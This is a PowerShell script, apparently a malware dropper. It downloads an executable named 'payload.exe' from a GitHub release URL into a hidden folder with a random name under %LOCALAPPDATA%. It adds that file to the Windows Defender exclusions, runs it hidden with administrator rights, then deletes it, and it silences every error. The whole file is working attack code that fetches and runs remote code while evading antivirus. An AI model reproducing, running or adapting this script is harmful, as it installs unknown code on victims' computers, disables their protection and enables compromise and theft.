# Define variables
$downloadUrl = "https://github.com/nyctsne/m2/releases/download/m/payload.exe"  # URL of the file to download
$updaterExe = "updater.exe"                           # Name of the downloaded file
$hiddenAttr = "Hidden"                                # Attribute to hide files/folders
$silentlyContinue = "SilentlyContinue"               # Error action for silent execution
$directory = "C:\Windows"                            # Target directory (not used in this script)
$runAs = "RunAs"                                     # Verb to run the process as administrator

# Create a hidden folder in %LOCALAPPDATA% with a random GUID name
$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null

# Define the full path to the downloaded file
$tempPath = Join-Path $hiddenFolder $updaterExe

# Function to add a path to Windows Defender exclusions
function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue | Out-Null
    } catch {
        # Suppress all errors
    }
}

# Main script logic
try {
    # Download the file from the URL
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $silentlyContinue | Out-Null

    # Hide the folder and file
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr -ErrorAction $silentlyContinue | Out-Null
    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr -ErrorAction $silentlyContinue | Out-Null

    # Add the file to Windows Defender exclusions (if applicable)
    Add-Exclusion -Path $tempPath

    # Execute the downloaded file as administrator
    Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -ErrorAction $silentlyContinue | Out-Null

    # Optionally, clean up the downloaded file (remove this line if you want to keep it)
    Remove-Item -Path $tempPath -Force -ErrorAction $silentlyContinue | Out-Null
} catch {
    # Suppress all errors
}
